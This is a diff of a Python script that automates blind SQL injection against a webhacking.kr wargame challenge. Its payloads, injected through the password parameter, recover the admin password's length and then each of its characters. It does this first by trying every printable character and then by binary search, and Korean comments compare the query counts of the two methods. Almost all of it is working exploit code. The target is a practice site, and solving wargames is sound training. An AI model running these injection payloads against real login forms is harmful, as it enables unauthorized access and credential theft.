@@ -1,26 +1,47 @@
+from pytest import param
 import requests
 
 url = "https://webhacking.kr/challenge/bonus-1/index.php"
+TRUE_FLAG = 'wrong password'
 params = {
-    'id' : '12345',
+    'id' : 'admin',
     'pw' : ''
 }
 
-
-
 def get_password_length():
-    for i in range(34,100):
-        injection_string = "' or length(pw) = {} and id='admin' -- ".format(str(i))
-        params['pw'] = injection_string
+    for i in range(1,100):
+        payload = "' or length(pw) = {} and id='admin' -- ".format(str(i))
+        params['pw'] = payload
         response = requests.get(url,params=params)
         
         if('wrong password' in response.text):
-            print("find password length")
+            print("find password length" + str(i))
             return i
 
+password_length = get_password_length()
 
-def get_password(password_length):
+#1. 단순 반복문을 통해서 비밀번호를 구한 경우
+def get_password1(password_length):
+    count = 0
     password = ''
+    for i in range(1,password_length+1):
+        for j in range(32,127):
+            payload = "' or id='admin' and ascii(substr(pw,{},1)) = {}-- ".format(i,j)
+            params['pw'] = payload
+            response = requests.get(url,params=params)
+            if(TRUE_FLAG in response.text):
+                password += chr(j)
+                print(password)
+            count +=1
+    print("총 쿼리문 동작 횟수 : "+ str(count))
+    return password
+
+get_password1(password_length)
+
+# 2. Binary Search 알고리즘을 이용해서 비밀번호를 구한 경우
+def get_password2(password_length):
+    password = ''
+    count = 0
     for i in range(1,password_length+1):
         left,right = 32,127 
         while(1):
@@ -51,14 +72,9 @@ def get_password(password_length):
                     print(chr(left))
                     password +=chr(left)
                     break
+            count = count+1
+    print("총 쿼리문 동작 횟수 : "+ str(count))
     return password
 
+get_password2(password_length)
 
-def main():
-    password_length = get_password_length()
-    password = get_password(password_length)
-    print("result : {}".format(password))
-
-
-if __name__ == '__main__':
-    main()
